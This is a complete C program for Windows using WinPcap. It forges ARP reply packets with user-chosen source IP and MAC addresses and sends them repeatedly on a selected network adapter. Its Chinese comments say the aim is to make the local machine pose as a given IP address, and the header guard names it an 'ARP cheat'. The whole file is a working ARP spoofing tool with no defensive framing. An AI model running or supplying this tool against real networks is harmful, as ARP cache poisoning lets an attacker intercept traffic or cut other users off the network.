#include "stdafx.h"
#include <stdio.h>
#include <pcap.h>
#include <conio.h>
#include <packet32.h>
#include <ntddndis.h>
#include <windows.h>


#ifndef MY_ARP_CHEAT_INCLUDE_H
#define MY_ARP_CHEAT_INCLUDE_H

//字节对齐必须是1
#pragma pack (1)
struct ethernet_head
{
    unsigned char dest_mac[6]; //目标主机MAC地址
    unsigned char source_mac[6]; //源端MAC地址
    unsigned short eh_type; //以太网类型
};

struct arp_head
{
    unsigned short hardware_type; //硬件类型：以太网接口类型为1
    unsigned short protocol_type; //协议类型：IP协议类型为0X0800
    unsigned char add_len; //硬件地址长度：MAC地址长度为6B
    unsigned char pro_len; //协议地址长度：IP地址长度为4B
    unsigned short option; //操作：ARP请求为1，ARP应答为2
    unsigned char sour_addr[6]; //源MAC地址：发送方的MAC地址
    unsigned long sour_ip; //源IP地址：发送方的IP地址
    unsigned char dest_addr[6];
    unsigned long dest_ip;
    unsigned char padding[18];
};

struct arp_packet //最终arp包结构
{
    ethernet_head eth; //以太网头部
    arp_head arp; //arp数据包头部
};
#pragma pack ()
unsigned char* BuildArpPacket(unsigned char* source_mac, unsigned char* dest_mac,
                              unsigned long src_ip, unsigned long dest_ip);

#endif



int main(void)
{
    char errbuf[PCAP_ERRBUF_SIZE];   //错误缓冲区
    int times;	//	发送次数
    int i = 0;
    
    unsigned char *packet;	//ARP包
    pcap_t *adhandle;	//一个pcap实例
    pcap_if_t *alldevs;	//	全部网卡列表
    pcap_if_t *device;	//	一个网卡
    int inum;	//	用户选择的网卡序号
    
    //	获得本机网卡列表
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }
    
    //	打印网卡列表
    for (device = alldevs; device; device = device->next)
    {
        printf("%d", ++i);
        if (device->description)
            printf(". %s\n", device->description);
        else
            printf(". No description available\n");
    }
    
    //	如果没有发现网卡
    if (i == 0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }
    //	请用户选择一个网卡
    printf("Enter the interface number (1-%d):", i);
    scanf_s("%d", &inum);
    
    //	移动指针到用户选择的网卡
    for (device = alldevs, i = 0; i< inum - 1; device = device->next, i++);
    
    char chs_src_ip[16] = {0};
    char chs_dest_ip[16] = {0};
    unsigned long ul_src_ip = 0u;
    unsigned long ul_dest_ip = 0u;
    getchar();
    printf("Input the src ip(192.168.1.1):");
    gets_s(chs_src_ip);
    
    ul_src_ip = inet_addr(chs_src_ip);
    printf("Input the dest ip(192.168.1.100):");
    gets_s(chs_dest_ip);
    ul_dest_ip = inet_addr(chs_dest_ip);
    
    unsigned char uchs_src_mac[10] = { 0 };
    unsigned char uchs_dest_mac[10] = { 0 };
    
    printf("Input source mac address(30 AD 23 A3 FC CD):");
    scanf_s("%x%x%x%x%x%x", &uchs_src_mac[0], &uchs_src_mac[1], &uchs_src_mac[2],
            &uchs_src_mac[3], &uchs_src_mac[4], &uchs_src_mac[5]);
    
    printf("Input dest mac address(30 AD 23 A3 FC CD):");
    scanf_s("%x%x%x%x%x%x", &uchs_dest_mac[0], &uchs_dest_mac[1], &uchs_dest_mac[2],
            &uchs_dest_mac[3], &uchs_dest_mac[4], &uchs_dest_mac[5]);
    
    printf("Input send times:");
    scanf_s("%d", &times);
    packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);
    
    /* 打开网卡 */
    if ((adhandle = pcap_open(device->name,          // name of the device
                              65536,            // portion of the packet to capture
                              0,                //open flag
                              1000,             // read timeout
                              NULL,             // authentication on the remote machine
                              errbuf            // error buffer
                              )) == NULL)
    {
        fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n",
                device->name);
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }
    //构建假的ARP请求包，达到本机伪装成给定的IP地址的目的
    packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);
    int j = 1;
    while (j <= times)
    {
        pcap_sendpacket(adhandle, packet, 60);
        Sleep(100);
        printf("%d:%s-->%s\n",j, chs_src_ip,chs_dest_ip);
        j++;
    }
    printf("end!!!\n");
    getchar();
    return 0;
}

unsigned char* BuildArpPacket(unsigned char* source_mac, unsigned char* dest_mac,
                              unsigned long src_ip, unsigned long dest_ip)
{
    static struct arp_packet packet;
    memcpy(packet.eth.dest_mac, dest_mac, 6);
    memcpy(packet.eth.source_mac, source_mac, 6);
    packet.eth.eh_type = htons(0x0806);
    
    packet.arp.hardware_type = htons(0x0001);
    packet.arp.protocol_type = htons(0x0800);
    packet.arp.add_len = 0x06;
    packet.arp.pro_len = 0x04;
    
    packet.arp.option = htons(0x0002);
    memcpy(packet.arp.sour_addr, source_mac, 6);
    packet.arp.sour_ip = src_ip;
    memcpy(packet.arp.dest_addr, dest_mac, 6);
    packet.arp.dest_ip = dest_ip;
    memset(packet.arp.padding, 0, 18);
    return (unsigned char*)&packet;
}
